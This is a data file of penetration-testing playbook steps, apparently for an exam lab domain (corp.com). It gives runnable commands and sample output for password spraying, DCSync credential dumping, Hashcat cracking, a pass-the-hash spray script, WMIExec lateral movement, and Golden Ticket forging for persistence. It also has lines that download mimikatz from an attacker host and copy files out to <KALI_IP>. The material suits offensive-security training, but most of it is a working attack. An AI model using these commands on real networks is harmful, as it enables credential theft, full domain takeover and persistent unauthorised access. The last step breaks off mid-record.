"optional-spray-round-4","Optional Round 4 - Higher Risk (Threshold-1)","Test fourth password with reduced safety margin if absolutely necessary","HIGH RISK - ONLY IF NECESSARY: Round 4 uses threshold-1 safety margin instead of threshold-2. Example: threshold 5 → 4 attempts (only 1 attempt buffer instead of 2). RISK ASSESSMENT: (1) Users might have failed login themselves = lockout. (2) Clock skew could cause timing issues = lockout. (3) Reduced margin for error. WHEN TO ATTEMPT: (1) Exam time running out and need credentials desperately. (2) High confidence that users haven't failed logins (monitoring). (3) Absolutely critical to test one more password. PROCESS: Same as previous rounds but with heightened monitoring. Watch for ANY lockout indicators. If single lockout detected - ABORT immediately. PASSWORD SELECTION: Choose highest probability password for final attempt. RECOMMENDATION: Generally NOT worth the risk. Stop at Round 3 unless absolutely critical.","",""
"configure-kerberos-kali","Configure Kerberos Client on Kali for AD Integration","Setup Kali Kerberos configuration to interact with Active Directory domain for ticket-based authentication","KERBEROS REQUIREMENT: Impacket Golden Ticket workflow requires proper Kerberos configuration for ticket validation and usage.

KERBEROS CONFIGURATION FILE: /etc/krb5.conf

BACKUP ORIGINAL CONFIG:
cp /etc/krb5.conf /etc/krb5.conf.bak

CREATE AD-SPECIFIC CONFIG:
sudo nano /etc/krb5.conf

REQUIRED CONFIGURATION:

[libdefaults]
    default_realm = CORP.COM
    dns_lookup_realm = false
    dns_lookup_kdc = true
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true
    rdns = false
    default_ccache_name = FILE:/tmp/krb5cc_%{uid}

[realms]
    CORP.COM = {
        kdc = dc01.corp.com
        admin_server = dc01.corp.com
        default_domain = corp.com
    }

[domain_realm]
    .corp.com = CORP.COM
    corp.com = CORP.COM

CONFIGURATION EXPLANATION:

[libdefaults]
- default_realm: Primary AD domain (UPPERCASE)
- dns_lookup_kdc: Auto-discover DCs via DNS SRV records (recommended)
- ticket_lifetime: TGT validity (24 hours standard)
- forwardable: Allow ticket forwarding for delegation
- rdns: Disable reverse DNS (avoid hostname resolution issues)

[realms]
- kdc: Domain Controller FQDN or IP
- admin_server: DC for administrative operations (same as kdc typically)

[domain_realm]
- Maps domain suffixes to Kerberos realms (LOWERCASE domain → UPPERCASE realm)

DNS CONFIGURATION (Required for dns_lookup_kdc):

Add DC as nameserver:
sudo nano /etc/resolv.conf

Add:
nameserver 192.168.50.1  # DC IP
search corp.com

OR (permanent via resolvconf):
sudo nano /etc/resolvconf/resolv.conf.d/head
nameserver 192.168.50.1

sudo resolvconf -u

VERIFY DNS RESOLUTION:
nslookup dc01.corp.com

Expected output:
Server:         192.168.50.1
Address:        192.168.50.1#53

Name:   dc01.corp.com
Address: 192.168.50.1

TEST KERBEROS CONFIGURATION:

Test ticket request (optional - requires valid credentials):
kinit administrator@CORP.COM
Password for administrator@CORP.COM: <enter password>

List tickets:
klist

Expected output:
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: administrator@CORP.COM

Valid starting       Expires              Service principal
11/23/2025 10:00:00  11/23/2025 20:00:00  krbtgt/CORP.COM@CORP.COM

DESTROY TEST TICKET:
kdestroy
(Removes test ticket - will create Golden Ticket later)

TIME SYNCHRONIZATION:

CRITICAL: Kerberos requires <5 minute time difference.

sudo ntpdate dc01.corp.com
OR
sudo rdate -n 192.168.50.1

Verify:
date
(Compare with DC time - must be within 5 minutes)

TROUBLESHOOTING:

Test Kerberos connectivity:
telnet dc01.corp.com 88
(Should connect - Kerberos port 88/tcp)

Check Kerberos logs:
sudo tail -f /var/log/auth.log
(Shows Kerberos authentication attempts and errors)

Common errors:
- KDC_ERR_C_PRINCIPAL_UNKNOWN: Wrong domain name or user doesn't exist
- KRB_AP_ERR_SKEW: Time synchronization issue (fix with ntpdate)
- Cannot resolve KDC: DNS issue (check /etc/resolv.conf)

FILE PERMISSIONS:

sudo chmod 644 /etc/krb5.conf
(Ensure readable by all users)

TIME ESTIMATE: 5-10 minutes.","",""
"dcsync-full-extraction-impacket","Execute Full DCSync from Kali with Impacket secretsdump","Extract all domain credentials including krbtgt hash using Impacket secretsdump entirely from Kali Linux","IMPACKET SECRETSDUMP: Python-based DCSync implementation - functionally identical to Mimikatz lsadump::dcsync but runs on Kali.

FULL DOMAIN DCSYNC COMMAND:
impacket-secretsdump -just-dc-ntlm '<DOMAIN>/<USERNAME>:<PASSWORD>@<DC_IP>' -outputfile domain_dump

Example:
impacket-secretsdump -just-dc-ntlm 'corp.com/dave:Password123!@192.168.50.1' -outputfile domain_dump

FLAGS EXPLANATION:
-just-dc-ntlm: Extract ONLY NTLM hashes (faster, smaller output)
  Alternative: -just-dc (includes Kerberos keys AES128/AES256 - slower, larger)
-outputfile domain_dump: Creates domain_dump.ntds file with all hashes

ALTERNATIVE: Use FQDN instead of IP (required for Kerberos auth):
impacket-secretsdump -just-dc-ntlm 'corp.com/dave:Password123!@dc01.corp.com' -outputfile domain_dump

OUTPUT (Real-time console):
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
              ^^^ THIS IS GOLDEN TICKET KEY - CRITICAL TO SAVE
dave:1104:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
sqlsvc:1125:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
<...hundreds to thousands more users...>
[*] Cleaning up...

OUTPUT FILE (domain_dump.ntds):
cat domain_dump.ntds

Format: username:RID:LM_hash:NTLM_hash:::
(Identical format to Windows Mimikatz output - cross-platform compatible)

CRITICAL DATA EXTRACTION:

(1) KRBTGT HASH (For Golden Ticket):
grep 'krbtgt:' domain_dump.ntds

Output:
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::

Extract just the NTLM hash:
grep 'krbtgt:' domain_dump.ntds | cut -d ':' -f 4

Result: a9b30e5b0dc865eadcea9411e4ade72d

Save to variable:
KRBTGT_HASH=$(grep 'krbtgt:' domain_dump.ntds | cut -d ':' -f 4)
echo $KRBTGT_HASH

(2) DOMAIN SID (For Golden Ticket):

Domain SID appears in secretsdump output as:
[*] Domain SID: S-1-5-21-1234567890-1234567890-1234567890

Extract from secretsdump console output OR query separately:
impacket-lookupsid 'corp.com/dave:Password123!@192.168.50.1' | grep ""Domain SID""

Output:
[*] Domain SID: S-1-5-21-1234567890-1234567890-1234567890

Save to variable:
DOMAIN_SID=""S-1-5-21-1234567890-1234567890-1234567890""
echo $DOMAIN_SID

(3) HIGH-VALUE USER HASHES:

Domain Admins:
grep -i 'administrator\|admin' domain_dump.ntds > admin_hashes.txt

Service accounts:
grep -iE 'svc|sql|web|backup|service' domain_dump.ntds > service_hashes.txt

EXTRACT NTLM HASHES FOR HASHCAT:
cut -d ':' -f 4 domain_dump.ntds > ntlm_hashes.txt

Verify:
head -5 ntlm_hashes.txt

Expected output:
a9b30e5b0dc865eadcea9411e4ade72d
31d6cfe0d16ae931b73c59d7e0c089c0
08d7a47a6f9f66b97b1bae4178747494
<...pure NTLM hashes...>

wc -l ntlm_hashes.txt
(Shows total user count extracted)

EXTRACTION STATISTICS:

echo ""[*] DCSync Statistics:""
echo ""Total users extracted: $(wc -l < domain_dump.ntds)""
echo ""krbtgt hash: $KRBTGT_HASH""
echo ""Domain SID: $DOMAIN_SID""
echo ""Admin accounts: $(wc -l < admin_hashes.txt)""
echo ""Service accounts: $(wc -l < service_hashes.txt)""

OPSEC IMPACT (Same as Windows Mimikatz):

- EventID 4662 for each user extracted (hundreds to thousands)
- DRSUAPI replication traffic from non-DC IP (Kali IP)
- Large data transfer (500MB-1GB for large domains)
- Blue team detection: Unusual replication source, sustained replication activity

TIME ESTIMATES:
- Small domain (50-500 users): 2-5 minutes
- Medium domain (500-2000 users): 5-15 minutes
- Large domain (2000-10000 users): 15-60 minutes

FAILURE SCENARIOS:

- ERROR_ACCESS_DENIED: Insufficient replication rights (need DA or DCSync permissions)
- Connection timeout: Network instability or DC offline
- KRB_AP_ERR_SKEW: Time sync issue (run sudo ntpdate dc01.corp.com)
- Cannot resolve DC FQDN: DNS configuration issue (check /etc/resolv.conf)

FAILURE RECOVERY:

If DCSync interrupted:
- Partial results saved to domain_dump.ntds (keep file)
- No resume capability - must restart full extraction
- Consider targeted extraction if full dump repeatedly fails

ADVANTAGES OVER WINDOWS WORKFLOW:

- No AV/EDR bypass needed (Mimikatz triggers every AV)
- No RDP latency (direct Kali terminal execution)
- No file transfers (hashes already on Kali for Hashcat)
- Consistent Python-based toolchain (Impacket suite uniformity)

TIME ESTIMATE: 5-20 minutes (domain size dependent).","",""
"crack-hashes-kali","Batch Crack NTLM Hashes on Kali with Hashcat","Recover plaintext passwords from extracted NTLM hashes using Kali-based Hashcat cracking","KALI HASHCAT CRACKING: Same process as Windows-based cracking but entirely on Kali (no file transfers needed).

HASHCAT MODE 1000: NTLM hash cracking

VERIFY HASHCAT INSTALLATION:
hashcat --version
(Should show v6.2.x or higher on Kali)

ATTACK PHASE 1: STRAIGHT DICTIONARY (Baseline - 1-5 minutes)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force

--force: Required on Kali VM (suppresses OpenCL warnings)

Expected: 15-25% crack rate (common weak passwords)

ATTACK PHASE 2: RULE-BASED ATTACK (Primary - 10-30 minutes)
hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Rule transformations:
- password → Password, PASSWORD, password1, password123, p@ssw0rd, etc.

Expected: 30-50% crack rate (corporate password patterns)

ATTACK PHASE 3: CUSTOM WORDLIST (Organization-specific - 5-10 minutes)

Create custom wordlist:
echo -e ""Corp\nCorporation\nCompanyName\nWelcome\nPassword\n2023\n2024"" > /tmp/custom.txt

Crack with rules:
hashcat -m 1000 -a 0 ntlm_hashes.txt /tmp/custom.txt -r /usr/share/hashcat/rules/best64.rule --force

Expected: Additional 10-20% crack rate

MONITOR CRACKING PROGRESS:

Press 's' during cracking:
Speed.........: 500.0 MH/s (GPU) OR 50.0 MH/s (CPU)
Recovered.....: 847/2450 (34.57%) Digests
Progress......: 14344384/14344384 (100.00%)

VIEW CRACKED PASSWORDS:
hashcat -m 1000 ntlm_hashes.txt --show

Output (hash:password format):
a9b30e5b0dc865eadcea9411e4ade72d:Password123!
08d7a47a6f9f66b97b1bae4178747494:Welcome2023
8846f7eaee8fb117ad06bdd830b7586c:SQLPass2023
<...hundreds more...>

MAP HASHES TO USERNAMES:

Create username:password credential file:
while read line; do
  hash=$(echo $line | cut -d ':' -f 1)
  pass=$(echo $line | cut -d ':' -f 2-)
  user=$(grep ""$hash"" domain_dump.ntds | cut -d ':' -f 1)
  if [ -n ""$user"" ]; then
    echo ""$user:$pass""
  fi
done < <(hashcat -m 1000 ntlm_hashes.txt --show) > credentials.txt

Result (credentials.txt):
Administrator:Password123!
dave:Welcome2023
sqlsvc:SQLPass2023
webadmin:IIS2023Web!
backup_admin:Backup1!
<...username:password pairs...>

PRIORITIZE RESULTS:

Domain Admins cracked:
grep -f <(net rpc group members ""Domain Admins"" -U 'dave%Password123!' -I 192.168.50.1 2>/dev/null) credentials.txt > domain_admins_cracked.txt

Alternative (if net rpc unavailable):
grep -iE 'administrator|admin' credentials.txt > admin_creds.txt

Service accounts cracked:
grep -iE 'svc|sql|web|backup|service' credentials.txt > service_creds.txt

UNCRACKED HASHES (Still usable for PTH):

Identify uncracked hashes:
comm -23 <(cut -d ':' -f 4 domain_dump.ntds | sort) <(hashcat -m 1000 ntlm_hashes.txt --show | cut -d ':' -f 1 | sort) > uncracked_hashes.txt

Map to usernames:
for hash in $(cat uncracked_hashes.txt); do
  grep ""$hash"" domain_dump.ntds
done > uncracked_users.txt

Format: username:RID:LM:NTLM::: (ready for PTH)

CRACKING STATISTICS:

Generate summary:
echo ""=== Hashcat Cracking Summary ===""
echo ""Total hashes: $(wc -l < ntlm_hashes.txt)""
echo ""Cracked: $(hashcat -m 1000 ntlm_hashes.txt --show | wc -l)""
echo ""Crack rate: $(hashcat -m 1000 ntlm_hashes.txt --show | wc -l) / $(wc -l < ntlm_hashes.txt) * 100 | bc)%""
echo ""Uncracked: $(wc -l < uncracked_hashes.txt)""
echo """"
echo ""High-value accounts cracked:""
grep -iE 'administrator|admin|da_' credentials.txt | wc -l

KALI-SPECIFIC OPTIMIZATIONS:

CPU vs GPU:
- Kali VM (no GPU): Use --force flag, expect ~50 MH/s
- Physical Kali with GPU: Much faster (~500-5000 MH/s depending on GPU)
- Check device: hashcat -I (lists OpenCL devices)

Memory issues (large hash files):
- Split ntlm_hashes.txt into batches:
split -l 1000 ntlm_hashes.txt hash_batch_

- Crack each batch:
for batch in hash_batch_*; do
  hashcat -m 1000 -a 0 $batch /usr/share/wordlists/rockyou.txt --force
done

KALI WORDLISTS:

Default location: /usr/share/wordlists/
- rockyou.txt (14M passwords - standard)
- /usr/share/seclists/Passwords/ (additional lists)
- /usr/share/wordlists/kaonashi.txt (if installed)

Decompress rockyou:
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
(If not already decompressed)

TIME ESTIMATE: 15-60 minutes (Phase 1-2 attacks, sufficient for exam).","",""
"validate-pth-crackmapexec","Validate Credentials with CrackMapExec Pass-the-Hash Spray","Test cracked passwords and uncracked hashes across subnet to identify local admin access using CrackMapExec from Kali","CRACKMAPEXEC: Multi-protocol pentesting tool built for Pass-the-Hash and credential validation (pre-installed on Kali).

VERIFY INSTALLATION:
crackmapexec --version
(Should show v5.x on Kali)

VALIDATION STRATEGY: Test both plaintext passwords AND NTLM hashes against target subnet.

TARGET SUBNET IDENTIFICATION:

From initial enumeration:
- DC: 192.168.50.1
- Subnet: 192.168.50.0/24
- Expected domain-joined systems: 10-50 (workstations, servers)

VALIDATION METHOD 1: PASSWORD-BASED SPRAY

Test single user across subnet:
crackmapexec smb 192.168.50.0/24 -u dave -p 'Welcome2023' -d corp.com

Output:
[+] 192.168.50.75:445 WS01 [+] corp.com\\dave:Welcome2023 (Pwn3d!)
                                                         ^^^^^^^^ LOCAL ADMIN
[+] 192.168.50.80:445 WS02 [+] corp.com\\dave:Welcome2023
                                                         (no Pwn3d) = Valid, not admin

VALIDATION METHOD 2: HASH-BASED PTH SPRAY

Test with NTLM hash (no password needed):
crackmapexec smb 192.168.50.0/24 -u sqlsvc -H '8846f7eaee8fb117ad06bdd830b7586c' -d corp.com

Same output format - PTH works without plaintext.

BATCH VALIDATION SCRIPT (Kali Bash):

#!/bin/bash
DOMAIN=""corp.com""
SUBNET=""192.168.50.0/24""
OUTPUT=""validation_results.txt""

echo ""[*] CrackMapExec validation - $(date)"" > $OUTPUT
echo """" >> $OUTPUT

# Test cracked passwords
echo ""[*] Testing cracked passwords"" | tee -a $OUTPUT
while IFS=':' read user pass; do
  echo ""[*] Testing: $user:$pass"" | tee -a $OUTPUT
  crackmapexec smb $SUBNET -u ""$user"" -p ""$pass"" -d $DOMAIN 2>&1 | tee -a $OUTPUT
  sleep 1  # Rate limiting
done < credentials.txt

echo """" >> $OUTPUT

# Test uncracked hashes
echo ""[*] Testing uncracked hashes (PTH)"" | tee -a $OUTPUT
while read line; do
  user=$(echo $line | cut -d ':' -f 1)
  hash=$(echo $line | cut -d ':' -f 4)
  echo ""[*] Testing: $user (hash)"" | tee -a $OUTPUT
  crackmapexec smb $SUBNET -u ""$user"" -H ""$hash"" -d $DOMAIN 2>&1 | tee -a $OUTPUT
  sleep 1
done < uncracked_users.txt

echo """" >> $OUTPUT
echo ""[*] Extracting Pwn3d! results"" | tee -a $OUTPUT
grep ""Pwn3d"" $OUTPUT | tee pwned_systems.txt

EXECUTE VALIDATION:
chmod +x cme_validate.sh
./cme_validate.sh

ANALYZE RESULTS:

View all compromised systems:
cat pwned_systems.txt

Expected output:
[+] 192.168.50.75:445 WS01 [+] corp.com\\dave:Welcome2023 (Pwn3d!)
[+] 192.168.50.100:445 SQL01 [+] corp.com\\sqlsvc:8846f7ea... (Pwn3d!)
[+] 192.168.50.105:445 WEB01 [+] corp.com\\webadmin:IIS2023Web! (Pwn3d!)
[+] 192.168.50.1:445 DC01 [+] corp.com\\Administrator:Password123! (Pwn3d!)

CREATE ACCESS MATRIX:

Extract structured data:
cat pwned_systems.txt | while read line; do
  ip=$(echo $line | grep -oP '\d+\.\d+\.\d+\.\d+')
  host=$(echo $line | awk '{print $3}')
  user=$(echo $line | grep -oP '\\\\\K[^:]+' | head -1)
  echo ""$ip,$host,$user,Local Admin""
done > access_matrix.csv

Result (access_matrix.csv):
192.168.50.75,WS01,dave,Local Admin
192.168.50.100,SQL01,sqlsvc,Local Admin
192.168.50.105,WEB01,webadmin,Local Admin
192.168.50.1,DC01,Administrator,Local Admin

PRIORITIZE TARGETS:

Domain Controller access:
grep 'DC01\|DC02\|DC' pwned_systems.txt
(If found: Domain-wide access confirmed)

Database/File servers:
grep -iE 'SQL|DB|FILE|SHARE' pwned_systems.txt

TARGET SELECTION FOR LATERAL MOVEMENT:

From access_matrix.csv, select:
1. Domain Controllers (full domain compromise)
2. Database servers (sensitive data, credential hunting)
3. File servers (document access)
4. Admin workstations (additional credentials)

CRACKMAPEXEC ADVANCED FEATURES:

Module execution (enumerate shares):
crackmapexec smb 192.168.50.100 -u sqlsvc -p 'SQLPass2023' -d corp.com --shares

Output:
[+] 192.168.50.100:445 SQL01 [+] corp.com\\sqlsvc:SQLPass2023 (Pwn3d!)
Share           Permissions     Remark
ADMIN$          READ,WRITE      Remote Admin
C$              READ,WRITE      Default share
IPC$            READ            Remote IPC
Backups         READ,WRITE      SQL Backups

Command execution:
crackmapexec smb 192.168.50.100 -u sqlsvc -p 'SQLPass2023' -d corp.com -x 'whoami'

Output:
[+] 192.168.50.100:445 SQL01 [+] corp.com\\sqlsvc:SQLPass2023 (Pwn3d!)
corp\\sqlsvc

Database enumeration:
crackmapexec mssql 192.168.50.100 -u sqlsvc -p 'SQLPass2023' -d corp.com --query ""SELECT name FROM sys.databases""

KALI-SPECIFIC NOTES:

- CME fully integrated in Kali (no installation needed)
- Supports SMB, WinRM, LDAP, MSSQL, SSH, RDP protocols
- Database mode: Stores results in ~/.cme/workspaces/ (useful for large campaigns)
- Threading: Use --threads 10 to speed up subnet scans

OPSEC CONSIDERATIONS:

- PTH spray generates EventID 4625 (failed logons) for unsuccessful attempts
- Successful PTH = EventID 4624 (Logon Type 3 - Network)
- SIEM detection: Multiple logon attempts from single source IP
- Rate limiting: Use sleep between attempts to avoid account lockout

FAILURE SCENARIOS:

- Zero Pwn3d! results: Users are standard users (no local admin)
  → Try: WinRM protocol (may have different permissions)
  → Alternative: Local privilege escalation after shell access

- All STATUS_LOGON_FAILURE: Wrong domain or account lockouts
  → Verify: Domain name correct, time synced, accounts not locked

- Connection timeout: SMB port 445 blocked
  → Alternative: Try WinRM (port 5985): crackmapexec winrm ...

TIME ESTIMATE: 5-10 minutes for /24 subnet with 10-20 users.","",""
"lateral-movement-impacket","Lateral Movement with Impacket WMIExec from Kali","Establish shell access on compromised systems using Impacket WMIExec entirely from Kali (no Windows required)","IMPACKET WMIEXEC: Python-based WMI command execution - functionally identical to Windows wmic.exe but runs on Kali.

WMIEXEC vs PSEXEC (Impacket variants):
- wmiexec: No service creation, no file writes, runs as user (stealthier)
- psexec: Creates service, writes to ADMIN$, runs as SYSTEM (louder, more privileges)

RECOMMENDATION: Use wmiexec for initial access (stealth), psexec if SYSTEM needed.

IMPACKET WMIEXEC COMMAND:

With password:
impacket-wmiexec '<DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET>'

With NTLM hash (PTH):
impacket-wmiexec -hashes :<NTLM_HASH> '<DOMAIN>/<USERNAME>@<TARGET>'

Example (password):
impacket-wmiexec 'corp.com/sqlsvc:SQLPass2023@192.168.50.100'

Example (hash):
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c 'corp.com/sqlsvc@192.168.50.100'

SUCCESSFUL CONNECTION:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\\>
whoami
corp\\sqlsvc
       ^^^^^^^^ Runs as authenticated user (NOT SYSTEM like psexec)

hostname
SQL01

BASIC RECONNAISSANCE:

C:\\> whoami /all
(User privileges, group memberships, SID)

C:\\> hostname
(System name)

C:\\> ipconfig
(Network configuration)

C:\\> net user
(Local users)

C:\\> net localgroup Administrators
(Local admin group members)

TARGET-SPECIFIC ACTIONS:

(1) DATABASE SERVER (SQL01):

C:\\> sqlcmd -S localhost -E -Q ""SELECT @@version""
(SQL Server version)

C:\\> sqlcmd -S localhost -E -Q ""SELECT name FROM sys.databases""
(List databases)

C:\\> dir ""C:\\Program Files\\Microsoft SQL Server\\"" /s /b
(Find SQL directories)

Credential hunting:
C:\\> findstr /si password *.config *.xml *.ini C:\\*
C:\\> findstr /si connectionstring *.config C:\\*

(2) WEB SERVER (WEB01):

C:\\> dir C:\\inetpub\\wwwroot
(Web root)

C:\\> type C:\\inetpub\\wwwroot\\web.config
(Configuration - often contains DB credentials)

C:\\> dir /s /b C:\\inetpub\\*.config
(Find all config files)

(3) DOMAIN CONTROLLER (DC01):

C:\\> net group ""Domain Admins"" /domain
(Domain Admin members)

C:\\> dir \\\\localhost\\SYSVOL\\corp.com\\scripts
(Logon scripts - may contain credentials)

C:\\> type \\\\localhost\\SYSVOL\\corp.com\\Policies\\*.xml
(GPP files - may contain cpassword)

FILE EXFILTRATION FROM KALI:

Method 1: SMB share access (read files directly):
impacket-smbclient -k 'corp.com/sqlsvc:SQLPass2023@192.168.50.100'

smb: \\> use C$
smb: \\> cd Users\\Administrator\\Desktop
smb: \\> get proof.txt
smb: \\> get local.txt

Method 2: Setup SMB server on Kali (upload/download files):
Kali: sudo impacket-smbserver -smb2support share /home/kali/loot

Target (via wmiexec): 
C:\\> copy C:\\Users\\Administrator\\Desktop\\proof.txt \\\\<KALI_IP>\\share\\

Method 3: Base64 encode (no SMB connectivity):
C:\\> certutil -encode C:\\sensitive.txt C:\\encoded.b64
C:\\> type C:\\encoded.b64
(Copy output to Kali, decode)

UPGRADE TO SYSTEM PRIVILEGES (If needed):

Switch to PSExec for SYSTEM shell:
exit (leave wmiexec)

impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c 'corp.com/sqlsvc@192.168.50.100'

C:\\> whoami
nt authority\\system
       ^^^^^^^^^^^^^^^^ SYSTEM privileges

CREDENTIAL DUMPING FROM KALI:

Option 1: Impacket secretsdump (remotely dump SAM/LSA/NTDS):
impacket-secretsdump 'corp.com/sqlsvc:SQLPass2023@192.168.50.100'

Output:
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:...
Guest:501:aad3b435b51404eeaad3b435b51404ee:...

[*] Dumping cached domain logon information (domain/username:hash)
corp.com/dave:$DCC2$10240#dave#...
corp.com/john:$DCC2$10240#john#...

[*] Dumping LSA Secrets
_SC_MSSQLSERVER:Password123ForSQL!
<...service account passwords in cleartext...>

Option 2: Upload Mimikatz via WMI (if needed):
C:\\> curl http://<KALI_IP>:8000/mimikatz.exe -o C:\\Windows\\Temp\\m.exe
C:\\> C:\\Windows\\Temp\\m.exe privilege::debug sekurlsa::logonpasswords exit

MULTI-TARGET AUTOMATION:

Batch access script:
#!/bin/bash
while read line; do
  ip=$(echo $line | cut -d ',' -f 1)
  user=$(echo $line | cut -d ',' -f 3)
  pass=$(grep ""^$user:"" credentials.txt | cut -d ':' -f 2)
  
  echo ""[*] Accessing $ip as $user""
  impacket-wmiexec ""corp.com/$user:$pass@$ip"" ""whoami && hostname && ipconfig"" > recon_$ip.txt
done < access_matrix.csv

KALI ADVANTAGES:

- All tools local on Kali (no Windows VM needed)
- No AV/EDR bypass (Mimikatz triggers every AV)
- Impacket native SMB/RPC implementation (no dependencies)
- Consistent Python toolchain (secretsdump, wmiexec, psexec, smbclient all Impacket)
- Fast iteration (no RDP latency)

OPSEC IMPACT:

- WMI execution = EventID 4688 (Process Creation via wmiprvse.exe)
- Less suspicious than PSExec service (no EventID 7045)
- Network traffic identical to legitimate WMI admin tasks
- Blue team detection: Unusual processes spawned by WMI Provider Host

LIMITATIONS:

- Semi-interactive shell (not fully interactive like SSH)
- Some commands may not work (interactive prompts, GUI apps)
- Output buffering (may not see real-time output)

ALTERNATIVES (If wmiexec fails):

1. impacket-psexec (louder but more reliable, SYSTEM shell)
2. impacket-smbexec (similar to psexec but no service file)
3. impacket-atexec (scheduled task execution)
4. impacket-dcomexec (DCOM-based execution)

TIME ESTIMATE: 2-5 minutes per target (shell access and initial recon).","",""
"create-golden-ticket-kali","Create and Validate Golden Ticket from Kali with Impacket Ticketer","Forge persistent domain access using Impacket ticketer.py to create Golden Ticket entirely from Kali","IMPACKET TICKETER: Python-based Golden Ticket creation - functionally identical to Mimikatz kerberos::golden but runs on Kali.

PREREQUISITES (From previous steps):
- krbtgt NTLM hash (from DCSync)
- Domain SID (from DCSync)
- Domain FQDN (corp.com)

RECALL EXTRACTED DATA:

echo ""krbtgt hash: $KRBTGT_HASH""
echo ""Domain SID: $DOMAIN_SID""

If variables not set:
KRBTGT_HASH=$(grep 'krbtgt:' domain_dump.ntds | cut -d ':' -f 4)
DOMAIN_SID=""S-1-5-21-1234567890-1234567890-1234567890""  # Replace with actual SID

GOLDEN TICKET CREATION:

impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain corp.com Administrator

Full example:
impacket-ticketer -nthash a9b30e5b0dc865eadcea9411e4ade72d -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.com Administrator

OPTIONAL FLAGS (Advanced OPSEC):
-duration <HOURS>: Ticket lifetime (default: 10 years). Use 10 for realism.
-user-id <RID>: User RID (default: 500 = Administrator)
-groups <RIDS>: Group memberships (default: 512,513,518,519,520 = all admin groups)

Realistic OPSEC-aware ticket:
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain corp.com -duration 10 -user-id 500 Administrator

OUTPUT:
[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.com/Administrator
[*] Signing/Encrypting final ticket
[*]   PAC_LOGON_INFO
[*]   EncTicketPart
[*] Saving ticket in Administrator.ccache
          ^^^ OUTPUT FILE (Kerberos credential cache)

VERIFY TICKET CREATED:
ls -lh Administrator.ccache

Expected: File size 1-2 KB (valid ticket data)

EXPORT TICKET TO ENVIRONMENT:

export KRB5CCNAME=$(pwd)/Administrator.ccache

Verify:
echo $KRB5CCNAME
Output: /home/kali/Administrator.ccache (or current directory path)

VIEW TICKET DETAILS:

klist

Output:
Ticket cache: FILE:/home/kali/Administrator.ccache
Default principal: Administrator@CORP.COM

Valid starting       Expires              Service principal
11/23/2025 10:00:00  11/23/2025 20:00:00  krbtgt/CORP.COM@CORP.COM
^^^ Valid now        ^^^ 10 hours (realistic)  ^^^ TGT (Golden Ticket)

VALIDATE GOLDEN TICKET ACCESS:

TEST 1: DCSync with Golden Ticket (Domain Admin operation):
impacket-secretsdump -k -no-pass 'corp.com/Administrator@dc01.corp.com' -just-dc-user krbtgt

Flags:
-k: Use Kerberos authentication (reads ticket from KRB5CCNAME)
-no-pass: No password prompt (using ticket auth)

Expected:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9b30e5b0dc865eadcea9411e4ade72d:::
       ^^^ SUCCESS - Golden Ticket works for DCSync

TEST 2: PSExec with Golden Ticket (SYSTEM shell on DC):
impacket-psexec -k -no-pass 'corp.com/Administrator@dc01.corp.com'

Expected:
C:\\Windows\\system32>
whoami
nt authority\\system
       ^^^^^^^^^^^^^^^^ SYSTEM on DC - Full domain control

TEST 3: SMB share access with Golden Ticket:
impacket-smbclient -k -no-pass '//dc01.corp.com/SYSVOL'

Expected:
smb: \\> ls
  .                                   D        0  <date>
  ..                                  D        0  <date>
  corp.com                            D        0  <date>

TEST 4: WMI execution with Golden Ticket:
impacket-wmiexec -k -no-pass 'corp.com/Administrator@dc01.corp.com'

Expected:
C:\\>
whoami
corp\\administrator

DOMAIN-WIDE ACCESS VALIDATION:

Test against multiple targets:
for target in dc01.corp.com sql01.corp.com web01.corp.com; do
  echo ""[*] Testing Golden Ticket against $target""
  impacket-wmiexec -k -no-pass ""corp.com/Administrator@$target"" ""whoami && hostname""
done

Expected: Access to ALL domain-joined systems.

PERSISTENCE DOCUMENTATION:

Create backup and re-access instructions:

SAVE GOLDEN TICKET COMPONENTS:
cat > golden_ticket_info.txt << EOF
=== Golden Ticket Persistence ===
Domain: corp.com
Domain SID: $DOMAIN_SID
krbtgt NTLM hash: $KRBTGT_HASH

Ticket file: Administrator.ccache
Created: $(date)
Expiration: 10 hours from creation

Re-creation command:
impacket-ticketer -nthash $KRBTGT_HASH -domain-sid $DOMAIN_SID -domain corp.com -duration 10 Administrator

Usage:
export KRB5CCNAME=/path/to/Administrator.ccache
impacket-psexec -k -no-pass 'corp.com/Administrator@dc01.corp.com'
EOF

BACKUP TICKET:
mkdir -p ~/loot/golden_tickets
cp Administrator.ccache ~/loot/golden_tickets/corp_Administrator_$(date +%Y%m%d).ccache
cp golden_ticket_info.txt ~/loot/golden_tickets/

RE-ACCESS PROCEDURE (Future use):

1. Regenerate ticket (if expired):
